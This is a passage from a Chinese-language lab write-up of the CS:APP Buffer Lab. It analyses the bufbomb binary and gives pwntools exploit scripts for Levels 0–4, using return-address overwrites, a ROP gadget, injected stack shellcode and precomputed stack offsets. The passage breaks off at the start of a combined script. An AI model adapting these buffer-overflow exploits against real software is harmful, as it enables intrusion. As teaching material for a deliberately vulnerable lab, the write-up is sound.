id="参数分发"><a href="#参数分发" class="headerlink" title="参数分发"></a>参数分发</h3><p><img src="/p/csappLAB-BufferLab/image-20210622192124217.png"></p><p>这里的<code>switch-case</code>部分是参数的分发，而必须执行的<code>case u</code>部分是将输入的<code>userid</code>作为参数传进<code>gencookie()</code>中来生成<code>cookie</code>，<code>gencookie()</code>里是：</p><p><img src="/p/csappLAB-BufferLab/image-20210622191344173.png"></p><p>大致逻辑是用<code>userid</code>的hash值作为<code>srand()</code>的种子，然后用<code>rand()</code>生成合法的<code>cookie</code>。</p><p>由此可见，<strong>对于同一个userid来说，<code>cookie</code>是相同的。</strong></p><p>还有一个需要关注的地方是<code>case n</code>，这是一个用来打开<code>Level 4</code>的开关，设置<code>v10=1;v3=5;</code>，在后面的分析中可以知道<code>v10</code>是用来看此时状态是否为<code>Level 4</code>的标志（1为打开<code>Level 4</code>，默认是0）；<code>v3</code>则是用来控制栈地址的个数的，在后面的分析中会详细说明。</p><p><code>case s</code>是我们完全不用关心的分支（lab的提交系统），<code>notify</code>标志着是否有输入这个参数，所以在后面的分析中，<code>notify == 1</code>相关的分支我们可以不用理会。</p><p><code>usage()</code>是输出help信息，依然可以忽略。</p><h3 id="对实验场景的初始化"><a href="#对实验场景的初始化" class="headerlink" title="对实验场景的初始化"></a>对实验场景的初始化</h3><p>回到main函数往下看，<code>initialize_bomb()</code>就是系统的初始化作用，主要是<code>notify == 1</code>的处理，不用考虑。</p><p>然后输出了<code>userid</code>和<code>cookie</code>。</p><p>再下面的逻辑中，用<code>cookie</code>作为<code>srandom()</code>的种子，然后用<code>random()</code>生成随机数依次给变量<code>v9</code>和<code>v5</code>数组赋值。</p><p><img src="/p/csappLAB-BufferLab/image-20210622193426031.png"></p><p>这里可以看到，<code>v9</code>的范围是<code>[0x100,0x10f0)</code>，<code>v5[i]</code>的范围是<code>[-0x70,0x80)</code>。</p><p><code>v5</code>数组是用来保存栈基址偏移的int32数组，默认情况下<code>v3=1</code>，即只有一个栈基址偏移（第一个为0），这样就能保证栈基址偏移不变；<code>Level 4</code>情况下<code>v3=5</code>，保存了5个栈基址偏移，并且需要执行5次<code>launcher()</code>。</p><p>最后传进<code>launcher()</code>里的是<code>v5[i]+v9</code>。</p><p>由此可见，虽然题目里说**<code>Level 4</code>的五次攻击栈基址是不同的，但因为<code>random()</code>的种子是<code>cookie</code>，所以实际上是可以全部算出来的**。于是在打<code>Level 4</code>的时候就可以完全照搬<code>Level 3</code>的办法，只用改栈基址就好。</p><p>总结：主函数后面的部分就是初始化要传进<code>launcher()</code>里的参数，然后走<code>launcher()</code>。</p><h3 id="launcher-解析"><a href="#launcher-解析" class="headerlink" title="launcher()解析"></a><code>launcher()</code>解析</h3><p><img src="/p/csappLAB-BufferLab/image-20210622195711227.png"></p><p><code>a1</code>就是主函数里的<code>v10</code>，这里传给<code>global_nitro</code>，这个全局变量就是用来标志是否为<code>Level 4</code>场景的，1则是0则否。</p><p><code>a2</code>则是主函数的<code>v5[i]+v9</code>，传给了全局变量<code>global_offset</code>，用来在后面的<code>launch()</code>函数中设置栈基址。</p><p><code>mmap()</code>这里是把<code>reserved</code>开头的<code> 0x100000</code>字节开了可读可写可执行的权限，即<code>[0x55586000,0x55686000)</code>。这段内存是用来做栈空间的，因为按照实验目的来说这个实验需要在堆栈固定的情况下才能实现，所以为了克服linux下文件的堆栈随机化，直接开辟了一个固定地址的栈空间出来，**<code>launcher()</code>主要做的就是栈迁移的工作**。</p><p><code>stack_top</code>实际上就是这块空间的最后<code>8byte</code>（这里我也不知道为什么预留了<code>8byte</code>而不是<code>4byte</code>，摊手），标志着整块空间的最高地址。</p><p>开了内存，接下来就要把<code>esp</code>挪过去了，这里需要去看汇编：</p><p><img src="/p/csappLAB-BufferLab/image-20210623103242004.png"></p><p>这一段是把程序正常的<code>esp</code>保存在<code>ds:global_save_stack</code>中，然后将<code>esp</code>迁移到<code>stack_top</code>处，然后<code>call launch()</code>，返回时从<code>ds:global_save_stack</code>复原原来的<code>esp</code>。</p><p>程序正常的<code>esp</code>：esp -&gt; eax -&gt; edx -&gt; ds:global_save_stack -&gt; <code>call luanch()</code> -&gt; eax -&gt; esp</p><p>实验场景中的<code>esp</code>：offset unk_55685FF8(即stack_top) -&gt; edx -&gt; esp -&gt; <code>call luanch()</code></p><p><strong>至此把<code>esp</code>挪到了这块空间的最高地址处</strong>。</p><p>至于为什么不把<code>ebp</code>也一并挪了……一般函数开头不都是经典两句：</p><p><img src="/p/csappLAB-BufferLab/image-20210623104843488.png"></p><p>顺便就保存ebp+挪了ebp啊（</p><p>接下来使用的栈空间就是这块<code>reserved</code>了。</p><h3 id="launch-解析"><a href="#launch-解析" class="headerlink" title="launch()解析"></a><code>launch()</code>解析</h3><p>这就是我们实验的主函数：</p><p><img src="/p/csappLAB-BufferLab/image-20210623105121477.png"></p><p><code>a1</code>就是<code>global_nitro</code>，标志是否为<code>Level 4</code>；若为<code>Level 4</code>则走<code>testn()</code>，否则走<code>test()</code>。</p><p><code>a2</code>是传进来的栈基址偏移，即<code>global_offset</code>，在<code>alloca()</code>中起到让esp偏移的作用（<code>alloca()</code>申请的内存在栈上，所以<code>((&amp;savedregs-72)&amp;0x3FF0)+a2+15</code>越大即<code>a2</code>越大，则申请到的空间越大，栈顶指针esp指向的地址越低）。<strong>这就是<code>Level 4</code>模式下栈基址不同的来源（此模式下<code>a2</code>不同，<code>esp</code>也不同，就是说进到<code>testn()</code>时的栈底地址也不同）</strong>。</p><p>而<code>memset</code>的作用是把这一段全部用<code>0xF4</code>填充，也就是说一旦执行到这一块会引发一个段错误(?)。</p><p>至于具体的原理看源码可以看到，是一个对栈调整的小技巧：</p><p><img src="/p/csappLAB-BufferLab/image-20210624010949853.png"></p><p>接下来就可以看各个<code>Level</code>的任务了。</p><h3 id="其余函数作用概括"><a href="#其余函数作用概括" class="headerlink" title="其余函数作用概括"></a>其余函数作用概括</h3><ul><li><p><code>test()</code>：<code>Level 0-3</code>的主函数。</p><p><img src="/p/csappLAB-BufferLab/image-20210624013150609.png"></p></li><li><p><code>testn()</code>：是<code>Level 4</code>的主函数，与<code>test()</code>差不多，唯一的区别在于输入调用了<code>getbufn()</code>而不是<code>getbuf()</code>。</p><p><img src="/p/csappLAB-BufferLab/image-20210624013206986.png"></p></li><li><p><code>getbuf()</code>：创建一个<code>40 bytes</code>的空间用来放输入。其中<code>Gets()</code>中除了输入字符串以外<strong>（末尾换行符置0）</strong>，还做了一些对<code>notify == 1</code>时提交到评分系统的处理，因为这是我们完全可以忽略的，所以可以当成C标准库里的<code>gets()</code>来用。</p><p><img src="/p/csappLAB-BufferLab/image-20210624013317074.png"></p></li><li><p><code>getbufn()</code>：同<code>getbuf()</code>，不过这里是用一个<code>520 bytes</code>的空间来存输入。</p><p><img src="/p/csappLAB-BufferLab/image-20210624013301117.png"></p></li><li><p><code>uniqueval()</code>：用当前进程号作为<code>srandom()</code>的种子，返回一个<code>random()</code>随机数。不过在同一个程序执行时，这个返回的数应该是一样的（摊手）。用在<code>test()</code>&#x2F;<code>testn()</code>中起到一个自制<code>canary</code>的作用，防止<code>test()</code>和<code>testn()</code>的栈溢出（正常的溢出应该控制在<code>getbuf()</code>&#x2F;<code>getbufn()</code>里）。</p><p><img src="/p/csappLAB-BufferLab/image-20210624013421741.png"></p></li><li><p><code>validate()</code>：走到这个函数就说明你的这一关卡成功了（Ohhhhhhh），调用的时候是<code>calidate(x)</code>就说明通过了第x关，这里只是在进行收尾工作。让<code>success=1</code>，并且计算每一关需要通关的次数及是否达到（前面四关为1，最后一关为5）。<code>notify</code>相关照例不用理会。</p><p><img src="/p/csappLAB-BufferLab/image-20210624084932458.png"></p></li></ul><p>该解释的都解释完了，现在开始做题（冲！</p><h1 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h1><p><code>Level 0</code>是一个最基础的缓冲区溢出，只要操控返回地址就可。</p><p>我们知道，在函数调用过程中（比如进到<code>getbut()</code>里时），栈的情况是：</p><p>（这里用四字节为一个单位，数组的标注形式用的是<code>Python</code>里的切片 &#x2F;指前闭后开）</p><blockquote><p>在汇编走到<code>call</code>的时候，程序会自动将下一条指令的地址压进栈里，然后跳到这个<code>call</code>的函数。在函数开始时，一半会有经典两句<code>push ebp; mov ebp, esp</code>来保存上一个栈帧的<code>ebp</code>，也就是图里画的<code>old ebp</code>。</p></blockquote><p><img src="/p/csappLAB-BufferLab/image-20210624161142968.png"></p><p>我们需要关注的是高亮的这块<code>ret addr</code>，只要让输入的<code>v1</code>足够长到覆盖这里就可，很容易看出v1需要输入：40个字节覆盖<code>v1</code>+4个字节覆盖<code>old ebp</code>+4个字节的返回地址（这里需要使用<code>smoke()</code>的地址即<code>0x8048B50</code>，这样就能操控ip返回到这个函数了）。</p><p><img src="/p/csappLAB-BufferLab/image-20210624101723841.png"></p><p>因为<code>smoke()</code>最后直接用<code>exit(0)</code>退出程序，不必回到上层函数，所以也不用管栈平衡和复原<code>ebp</code>的问题。</p><p><img src="/p/csappLAB-BufferLab/image-20210624102538785.png"></p><p>最后用<code>python2</code>的<code>pwntools</code>写exp有：（省略了<code>import</code>和主函数部分，这里只贴关键代码）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level0</span>():</span></span><br><span class="line">    r=process(argv=[<span class="string">&#x27;./bufbomb&#x27;</span>,<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;111&#x27;</span>],executable=<span class="string">&quot;./bufbomb&quot;</span>)</span><br><span class="line">    smoke=<span class="number">0x8048B50</span></span><br><span class="line">    r.recv()</span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">44</span>+p32(smoke)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    print(r.recv())</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure><p>然后调用<code>level0()</code>即可。</p><p><img src="/p/csappLAB-BufferLab/image-20210624102129611.png"></p><h1 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h1><p>跟<code>Level 0</code>的区别是<code>fizz()</code>是一个带参执行函数：</p><p><img src="/p/csappLAB-BufferLab/image-20210624102813936.png"></p><p>只有在调用<code>fizz()</code>的时候传入参数<code>cookie</code>才能通关。</p><p>这里需要知道<code>Linux x86</code>的函数调用方式是依次将参数从右往左入栈，也就是说是从栈上取参数的。</p><p>正常函数<code>call</code>的时候会把返回地址压栈，所以取参数是从栈顶下一个单元开始取的。</p><p>即<code>foo(arg0,arg1)</code>调用时的栈情况为：</p><p><img src="/p/csappLAB-BufferLab/image-20210624145915628.png"></p><p>而在这道题里，<code>fizz()</code>是直接改了ip跳过去的（相当于<code>jmp</code>），并没有将返回地址压栈，但是取参数的时候仍然是按照这种规律来取，所以要空一个单元再放参数。</p><p>所以需要构造栈的分布为：</p><p><img src="/p/csappLAB-BufferLab/image-20210624150726739.png"></p><p>在这里因为<code>fizz()</code>是通过<code>exit(0)</code>直接退出程序的，所以依然不用管栈平衡。不过一般来说中间的这个随便填单元可以是<code>rop</code>链，这里选用了<code>pop ebx; ret</code>（地址在<code>0x0804875d</code>处，类似的这种可以用<code>ROPgadget</code>等工具找）。</p><p><img src="/p/csappLAB-BufferLab/image-20210624151135868.png"></p><p>这样就可以在返回的时候调用这两条语句，进而将压进去的<code>cookie</code>值从栈上清掉，回到正常的函数流程。</p><p>反正这里不必这么麻烦，随便填单元可以随便填，但是习惯来说还是用这个<code>pop ebx; ret</code>的地址填上了（也就是exp里的<code>pop_ebx</code>）。</p><p>关键代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level1</span>():</span></span><br><span class="line">    r=process(argv=[<span class="string">&#x27;./bufbomb&#x27;</span>,<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;111&#x27;</span>],executable=<span class="string">&quot;./bufbomb&quot;</span>)</span><br><span class="line">    fizz=<span class="number">0x8048B7A</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Cookie: &#x27;</span>)</span><br><span class="line">    cookie=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">    print(<span class="string">&quot;[.] get cookie -&gt; &quot;</span>+<span class="built_in">hex</span>(cookie))</span><br><span class="line">    pop_ebx=<span class="number">0x0804875d</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">44</span>+p32(fizz)+p32(pop_ebx)+p32(cookie)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    print(r.recv())</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure><p><img src="/p/csappLAB-BufferLab/image-20210624151416485.png"></p><h1 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h1><p><code>Level 2</code>需要跳转的函数也是无参函数，跟<code>Level 0</code>的区别在要让全局变量<code>global_value == cookie</code>才能过关。</p><p><img src="/p/csappLAB-BufferLab/image-20210624151613204.png"></p><p>因为是改全局变量，所以考虑写shellcode，直接用<code>mov</code>来改。</p><p>shellcode为：（这里只是用来说明思路，用<code>&amp;</code>表示取地址，不符合汇编语法）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov dword ptr [&amp;global_value],cookie</span><br><span class="line">push &amp;bang</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>先让<code>global_value=cookie</code>，然后把<code>bang()</code>的地址压栈，这样在下一步ret的时候就会返回到栈顶存的地址即跳到<code>bang()</code>函数。</p><p>因为这里栈空间开的权限是<code>rwx</code>（可读可写可执行），所以这段shellcode可以直接放在栈上，现在需要的就是让前面的<code>ret addr</code>等于这段shellcode的首地址，这样就能跳到shellcode处执行。</p><p>需要构造的栈空间分布是：</p><p><img src="/p/csappLAB-BufferLab/image-20210624153052025.png"></p><p>现在要填的内容只差<code>shellcode_addr</code>是没拿到的。</p><p>这里可以用pwntools里提供的gdb接口进行调试来拿（发送的payload为<code>&#39;a&#39;*43</code>，这样可以很容易找到返回地址和后面的地址在哪里，注意pwntools的<code>sendline()</code>自带末尾换行符也会被输进去，所以要少输一个字节）。</p><p><img src="/p/csappLAB-BufferLab/image-20210624163720793.png"></p><p><img src="/p/csappLAB-BufferLab/image-20210624163817082.png"></p><p>执行到<code>getbuf()</code>时用<code>hexdump</code>看<code>esp</code>地址往后的十六进制，蓝框处是我们的<code>ret addr</code>该填的地方，绿框开始的部分就可以用来填shellcode（首地址为<code>0x55683928</code>）。</p><p>也可以直接用<code>stack</code>看栈布局：</p><p><img src="/p/csappLAB-BufferLab/image-20210624163836389.png"></p><p>同样可以看到<code>0x55683928</code>这个地址是可以开始填<code>shellcode</code>的地方。</p><p>于是写exp有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level2</span>():</span></span><br><span class="line">    r=process(argv=[<span class="string">&#x27;./bufbomb&#x27;</span>,<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;111&#x27;</span>],executable=<span class="string">&quot;./bufbomb&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    bang=<span class="number">0x8048BC5</span></span><br><span class="line">    global_value=<span class="number">0x804D100</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Cookie: &#x27;</span>)</span><br><span class="line">    cookie=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">    print(<span class="string">&quot;[.] get cookie -&gt; &quot;</span>+<span class="built_in">hex</span>(cookie))</span><br><span class="line">    <span class="comment"># raw_input(&#x27;#&#x27;)</span></span><br><span class="line">    shellcode=asm(<span class="string">&#x27;mov dword ptr [%s],%s&#x27;</span>%(global_value,cookie))+\</span><br><span class="line">              asm(<span class="string">&#x27;push %s&#x27;</span>%bang)+\</span><br><span class="line">              asm(<span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line">    shellcode_addr=<span class="number">0x55683928</span></span><br><span class="line">    <span class="comment"># payload=&#x27;a&#x27;*43</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">44</span>+p32(shellcode_addr)+shellcode</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    print(r.recv())</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure><p><img src="/p/csappLAB-BufferLab/image-20210624154623213.png"></p><h1 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h1><p><code>Level 3</code>的关键点在：</p><ol><li>让<code>getbuf()</code>的返回值为<code>cookie</code>。</li><li>维持堆栈平衡，注意<code>old ebp</code>的复原。</li></ol><p><img src="/p/csappLAB-BufferLab/image-20210624155016700.png"></p><p>所以程序流程是：<code>getbuf()</code> -&gt; <code>shellcode</code>（把放函数返回值的寄存器即<code>eax</code>的值改成<code>cookie</code>） -&gt; 回到<code>test()</code>里调用<code>getbuf()</code>的下一行（返回地址用<code>ret_addr</code>记录）。</p><p><code>shellcode_addr</code>跟<code>Level 2</code>的一样，<code>ret_addr</code>可以在IDA中看到是<code>0x8048CD6</code>：</p><p><img src="/p/csappLAB-BufferLab/image-20210624155448460.png"></p><p>现在就差需要复原的<code>old ebp</code>是未知量，用gdb调就可以拿到。</p><p>跟<code>Level 2</code>的调试流程同，不过payload只输<code>&#39;a&#39;*39</code>就好（同之前一样，pwntools的<code>sendline()</code>自带一个换行符，被<code>Gets()</code>置0了），因为要拿到覆盖前的<code>old ebp</code>。</p><p><img src="/p/csappLAB-BufferLab/image-20210624163249234.png"></p><p>蓝框处就是<code>old ebp</code>，用<code>p/x</code>把这个值的十六进制打印出来是<code>0x55683950</code>。</p><p>所以填进exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level3</span>():</span></span><br><span class="line">    r=process(argv=[<span class="string">&#x27;./bufbomb&#x27;</span>,<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;111&#x27;</span>],executable=<span class="string">&quot;./bufbomb&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Cookie: &#x27;</span>)</span><br><span class="line">    cookie=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">    print(<span class="string">&quot;[.] get cookie -&gt; &quot;</span>+<span class="built_in">hex</span>(cookie))</span><br><span class="line">    <span class="comment"># raw_input(&#x27;#&#x27;)</span></span><br><span class="line">    old_ebp=<span class="number">0x55683950</span></span><br><span class="line">    ret_addr=<span class="number">0x8048CD6</span></span><br><span class="line">    shellcode_addr=<span class="number">0x55683928</span></span><br><span class="line">    shellcode=asm(<span class="string">&#x27;mov eax,%s&#x27;</span>%cookie)+\</span><br><span class="line">              asm(<span class="string">&#x27;push %s&#x27;</span>%ret_addr)+\</span><br><span class="line">              asm(<span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line">    <span class="comment"># payload=&#x27;a&#x27;*39</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p32(old_ebp)+p32(shellcode_addr)+shellcode</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    print(r.recv())</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure><p><img src="/p/csappLAB-BufferLab/image-20210624163514769.png"></p><h1 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h1><p><code>Level 4</code>的要求和<code>Level 3</code>大致相同，除了要攻击5次，并且这5次的栈基址会发生变化。</p><p>从前面的分析可以知道，栈基址的变化是通过事先用<code>random()</code>生成5个随机数然后分别传值实现的（保存在<code>main()</code>的<code>v5</code>中），那我们可以通过同样的方式生成这五个随机数，在<code>Level 3</code>的基础上把地址稍作改变就可。</p><p><img src="/p/csappLAB-BufferLab/image-20210624164612833.png"></p><p>编写生成这样五个随机数的<code>rand.c</code>有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cookie=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;cookie);</span><br><span class="line">    srandom(cookie);</span><br><span class="line">    <span class="keyword">int</span> v9=(random()&amp;<span class="number">0xFF0</span>)+<span class="number">256</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,v9);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp=<span class="number">128</span>-(random()&amp;<span class="number">0xF0</span>)+v9;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用<code>gcc rand.c -o rand</code>编译，得到二进制文件<code>rand</code>。</p><p>在exp中就可以用<code>pexpect</code>模块进行交互，将<code>cookie</code>输入并拿到输出的五个随机数。</p><p>与<code>Level 3</code>的exp相比，shellcode完全可以复用（与栈基址无关），而程序流程完全相同，只有栈基址发生了变化（以及预期输入的长度从40变到了520），所以只要相应地改变<code>old ebp</code>和<code>shellcode_addr</code>就好。</p><p>同样是从前面对<code>launch()</code>分析中可以知道，其他关卡的基址和<code>Level 4</code>的第一次是一样的，栈基址是通过申请空间的大小来操控，申请的空间与<code>v5[i]</code>有关，<code>v5[i]</code>越大申请的空间越大，栈基址就越低。</p><p>所以可以通过倒推得到这个加上随机数之前的<code>base</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level4</span>():</span></span><br><span class="line">    r=process(argv=[<span class="string">&#x27;./bufbomb&#x27;</span>,<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;111&#x27;</span>,<span class="string">&#x27;-n&#x27;</span>],executable=<span class="string">&quot;./bufbomb&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;Cookie: &#x27;</span>)</span><br><span class="line">    cookie=<span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).strip(),<span class="number">16</span>)</span><br><span class="line">    print(<span class="string">&quot;[.] get cookie -&gt; &quot;</span>+<span class="built_in">hex</span>(cookie))</span><br><span class="line">    p=pexpect.spawn(<span class="string">&quot;./rand&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(cookie))</span><br><span class="line">    data=p.read().split(<span class="string">&#x27;\r\n&#x27;</span>)[<span class="number">-6</span>:<span class="number">-1</span>]</span><br><span class="line">    p.wait()</span><br><span class="line">    print(<span class="string">&quot;[.] get rand -&gt; &quot;</span>+<span class="built_in">str</span>(data)) <span class="comment">#拿到这5个随机数</span></span><br><span class="line">    data=[<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> data]</span><br><span class="line">    ebp_base=<span class="number">0x55683950</span>+data[<span class="number">0</span>] <span class="comment">#倒推得到base值</span></span><br><span class="line">    shellcode_base=<span class="number">0x55683928</span>+data[<span class="number">0</span>] <span class="comment">#倒推得到base值</span></span><br><span class="line">    ret_addr=<span class="number">0x8048D42</span></span><br><span class="line">    shellcode=asm(<span class="string">&#x27;mov eax,%s&#x27;</span>%cookie)+\</span><br><span class="line">              asm(<span class="string">&#x27;push %s&#x27;</span>%ret_addr)+\</span><br><span class="line">              asm(<span class="string">&#x27;ret&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="comment"># raw_input(&#x27;#&#x27;)</span></span><br><span class="line">        ebp=ebp_base-data[i]</span><br><span class="line">        shellcode_addr=shellcode_base-data[i]</span><br><span class="line">        payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">520</span>+p32(ebp)+p32(shellcode_addr)+shellcode</span><br><span class="line">        r.sendline(payload)</span><br><span class="line">        print(r.recv())</span><br><span class="line">    r.close()</span><br></pre></td></tr></table></figure><p><img src="/p/csappLAB-BufferLab/image-20210624165941916.png"></p><p>最后五个关卡的exp汇总有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># ------ Python2 ------</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"></span><br><span class="line"><span class="comment"># 